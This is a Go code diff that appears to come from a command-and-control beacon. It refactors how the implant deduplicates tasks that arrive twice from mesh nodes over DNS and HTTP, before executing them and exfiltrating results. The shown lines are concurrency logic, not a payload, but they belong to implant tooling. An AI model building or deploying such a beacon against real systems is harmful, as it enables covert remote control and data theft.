@@ -569,6 +569,41 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	return fmt.Errorf("failed to send completion message after 3 attempts: %v", err)
 }
 
+// claimTask marks a task as executed, reporting false when another delivery of the same
+// task already claimed it.
+//
+// The mark happens *before* execution, not after. Two mesh nodes can hand the same task
+// to one beacon at nearly the same moment — over DNS and over HTTP, for instance — and
+// marking afterwards would let both pass the check and run the command twice. The task
+// id is what both deliveries share, so the claim is keyed on it.
+func (b *Beacon) claimTask(taskID string) bool {
+	if taskID == "" {
+		// A task with no id cannot be deduplicated, so it is never claimed. Running it
+		// would be running something that cannot be tracked or reported.
+		return false
+	}
+
+	b.executedMu.Lock()
+	defer b.executedMu.Unlock()
+
+	if b.executedTasks[taskID] {
+		return false
+	}
+
+	b.executedTasks[taskID] = true
+	b.executedOrder = append(b.executedOrder, taskID)
+
+	// Bounded history: the oldest ids are forgotten first, which is safe because a
+	// mesh node re-delivers a task only while it is unconfirmed, well inside this
+	// window.
+	for len(b.executedOrder) > b.executedMaxSize {
+		delete(b.executedTasks, b.executedOrder[0])
+		b.executedOrder = b.executedOrder[1:]
+	}
+
+	return true
+}
+
 // operationForMessage maps a protocol message to the listener operation that
 // should carry it. The listener routes by path, so this is what decides which
 // configured URI a message travels to.
@@ -890,21 +925,11 @@ func (b *Beacon) runBeacon() {
 				}
 			}
 
-			// Dedup: skip if we've already executed this task (Shadow Mesh race window)
-			// Mark as executed BEFORE execution to close the TOCTOU race —
-			// if another DNS server delivers the same task concurrently, it will be skipped
-			b.executedMu.Lock()
-			if b.executedTasks[taskID] {
-				b.executedMu.Unlock()
+			// Dedup: a task may arrive twice when two mesh nodes deliver it, or when one
+			// is delivered over DNS and again over HTTP. Only the first claim executes.
+			if !b.claimTask(taskID) {
 				continue
 			}
-			b.executedTasks[taskID] = true
-			b.executedOrder = append(b.executedOrder, taskID)
-			for len(b.executedOrder) > b.executedMaxSize {
-				delete(b.executedTasks, b.executedOrder[0])
-				b.executedOrder = b.executedOrder[1:]
-			}
-			b.executedMu.Unlock()
 
 			// Wrap task execution in panic recovery to prevent beacon crash
 			func() {
